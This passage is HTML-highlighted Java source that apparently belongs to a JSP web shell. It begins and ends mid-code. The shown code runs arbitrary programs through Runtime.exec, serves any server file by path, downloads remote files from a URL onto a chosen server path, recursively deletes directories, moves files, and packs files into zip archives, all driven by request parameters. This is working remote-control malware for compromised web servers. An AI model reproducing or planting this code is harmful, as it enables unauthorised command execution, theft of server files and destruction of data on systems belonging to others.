class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(program)) &#123;</span></span><br><span class="line"><span class="vbscript">Process pro = Runtime.getRuntime().exec(program);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Program Has Run Success!"</span>);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vs"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DownInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path  = <span class="built_in">request</span>.getParameter(<span class="string">"path"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(path)) </span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!f.exists()) </span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.setHeader(<span class="string">"Content-Disposition"</span>,<span class="string">"attachment;filename="</span>+URLEncoder.encode(f.getName(),PAGE_CHARSET));</span></span><br><span class="line"><span class="vbscript">BufferedInputStream input = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(f));</span></span><br><span class="line"><span class="vbscript">BufferedOutputStream output = <span class="keyword">new</span> BufferedOutputStream(<span class="built_in">response</span>.getOutputStream());</span></span><br><span class="line"><span class="vbscript">byte[] data = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = input.read(data);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">output.write(data,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = input.read(data);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">input.close();</span></span><br><span class="line"><span class="vbscript">output.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//VDown</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VdInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> savepath = <span class="built_in">request</span>.getParameter(<span class="string">"savepath"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> url = <span class="built_in">request</span>.getParameter(<span class="string">"url"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(url))</span></span><br><span class="line"><span class="vbscript">url = <span class="string">"http://www.forjj.com/"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(savepath)) &#123;</span></span><br><span class="line"><span class="vbscript">savepath = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(JSession.getAttribute(<span class="string">"done"</span>))) &#123;</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,<span class="string">"Download Remote File Success!"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Remote File DownLoad &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>downRemote\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Remote File URL:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input class=\"</span>input\<span class="string">" name=\"</span>url\<span class="string">" value=\""+url+"</span>\<span class="string">" id=\"</span>url\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">70</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Save Path:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>savepath\<span class="string">" id=\"</span>savepath\<span class="string">" value=\""+savepath+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">70</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>connect\<span class="string">" id=\"</span>connect\<span class="string">" value=\"</span>DownLoad\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DownRemoteInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">true</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">true</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> downFileUrl = <span class="built_in">request</span>.getParameter(<span class="string">"url"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> savePath = <span class="built_in">request</span>.getParameter(<span class="string">"savepath"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(downFileUrl) || Util.<span class="built_in">isEmpty</span>(savePath))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">URL downUrl = <span class="keyword">new</span> URL(downFileUrl);</span></span><br><span class="line"><span class="vbscript">URLConnection conn = downUrl.openConnection();</span></span><br><span class="line"><span class="vbscript">BufferedInputStream <span class="keyword">in</span> = <span class="keyword">new</span> BufferedInputStream(conn.getInputStream());</span></span><br><span class="line"><span class="vbscript">BufferedOutputStream out = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(savePath)));</span></span><br><span class="line"><span class="vbscript">byte[] data = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = <span class="keyword">in</span>.read(data);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">out.write(data,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = <span class="keyword">in</span>.read(data);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>.close();</span></span><br><span class="line"><span class="vbscript">out.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"done"</span>,<span class="string">"d"</span>);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vd"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> IndexInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"filelist"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MkDirInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> name = <span class="built_in">request</span>.getParameter(<span class="string">"name"</span>);</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(name);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!f.isAbsolute()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!path.endsWith(<span class="string">"/"</span>))</span></span><br><span class="line"><span class="vbscript">path += <span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">path += name;</span></span><br><span class="line"><span class="vbscript">f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">f.mkdirs();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Make Directory Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MoveInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> src = <span class="built_in">request</span>.getParameter(<span class="string">"src"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> target  = <span class="built_in">request</span>.getParameter(<span class="string">"to"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(target) &amp;&amp; !Util.<span class="built_in">isEmpty</span>(src)) &#123;</span></span><br><span class="line"><span class="vbscript">File file = <span class="keyword">new</span> File(src);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(file.renameTo(<span class="keyword">new</span> File(target))) &#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Move File Success!"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> msg = <span class="string">"Move File Failed!"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (file.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">msg += <span class="string">"The Move Will Failed When The Directory Is Not Empty."</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,msg);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> RemoteDirInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> dir = <span class="built_in">request</span>.getParameter(<span class="string">"dir"</span>);</span></span><br><span class="line"><span class="vbscript">File file = <span class="keyword">new</span> File(dir);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (file.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">deleteFile(file);</span></span><br><span class="line"><span class="vbscript">deleteDir(file);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Remove Directory Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void deleteFile(File f) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.isFile()) &#123;</span></span><br><span class="line"><span class="vbscript">f.delete();</span></span><br><span class="line"><span class="vbscript">&#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">File[] list = f.listFiles();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (File ff:list) &#123;</span></span><br><span class="line"><span class="vbscript">deleteFile(ff);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void deleteDir(File f) &#123;</span></span><br><span class="line"><span class="vbscript">File[] list = f.listFiles();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (list.length == <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="vbscript">f.delete();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (File ff:list) &#123;</span></span><br><span class="line"><span class="vbscript">deleteDir(ff);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">deleteDir(f);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> PackBatchInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> files = <span class="built_in">request</span>.getParameter(<span class="string">"files"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(files))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> saveFileName = <span class="built_in">request</span>.getParameter(<span class="string">"savefilename"</span>);</span></span><br><span class="line"><span class="vbscript">File saveF = <span class="keyword">new</span> File(JSession.getAttribute(CURRENT_DIR).toString(),saveFileName);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (saveF.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"The File \""+saveFileName+"</span>\<span class="string">" Has Been Exists!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">ZipOutputStream zout = <span class="keyword">new</span> ZipOutputStream(<span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(saveF)));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span>[] arr = files.<span class="built_in">split</span>(<span class="string">","</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">String</span> f:arr) &#123;</span></span><br><span class="line"><span class="vbscript">File pF = <span class="keyword">new</span> File(JSession.getAttribute(CURRENT_DIR).toString(),f);</span></span><br><span class="line"><span class="vbscript">ZipEntry entry = <span class="keyword">new</span> ZipEntry(pF.getName());</span></span><br><span class="line"><span class="vbscript">zout.putNextEntry(entry);</span></span><br><span class="line"><span class="vbscript">FileInputStream fInput = <span class="keyword">new</span> FileInputStream(pF);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript">byte[] buf = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((<span class="built_in">len</span> = fInput.read(buf)) != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">zout.write(buf, <span class="number">0</span>, <span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript">zout.flush();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">fInput.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">zout.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Pack Files Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> PackInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> packedFile = <span class="built_in">request</span>.getParameter(<span class="string">"packedfile"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(packedFile))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> saveFileName = <span class="built_in">request</span>.getParameter(<span class="string">"savefilename"</span>);</span></span><br><span class="line"><span class="vbscript">File saveF = <span class="keyword">new</span> File(JSession.getAttribute(CURRENT_DIR).toString(),saveFileName);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (saveF.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"The File \""+saveFileName+"</span>\<span class="string">" Has Been Exists!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">File pF = <span class="keyword">new</span> File(packedFile);</span></span><br><span class="line"><span class="vbscript">ZipOutputStream zout = <span class="keyword">new</span> ZipOutputStream(<span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(saveF)));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> base = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (pF.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">zipDir(pF,base,zout);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">zipFile(pF,base,zout);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">zout.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Pack File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void zipDir(File f,<span class="built_in">String</span> base,ZipOutputStream zout)  throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">File[] arr = f.listFiles();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (File ff:arr) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> tmpBase = base;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(tmpBase) &amp;&amp; !tmpBase.endsWith(<span class="string">"/"</span>))</span></span><br><span class="line"><span class="vbscript">tmpBase += <span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">zipDir(ff,tmpBase+f.getName(),zout);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> tmpBase = base;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(tmpBase) &amp;&amp;!tmpBase.endsWith(<span class="string">"/"</span>))</span></span><br><span class="line"><span class="vbscript">tmpBase += <span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">zipFile(f,tmpBase,zout);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void zipFile(File f,<span class="built_in">String</span> base,ZipOutputStream zout) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">ZipEntry entry = <span class="keyword">new</span> ZipEntry(base+f.getName());</span></span><br><span class="line"><span class="vbscript">zout.putNextEntry(entry);</span></span><br><span class="line"><span class="vbscript">FileInputStream fInput = <span class="keyword">new</span> FileInputStream(f);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript">byte[] buf = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((<span class="built_in">len</span> = fInput.read(buf)) != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">zout.write(buf, <span class="number">0</span>, <span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript">zout.flush();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">fInput.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> UnPackInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> savepath = <span class="built_in">request</span>.getParameter(<span class="string">"savepath"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> zipfile = <span class="built_in">request</span>.getParameter(<span class="string">"zipfile"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> 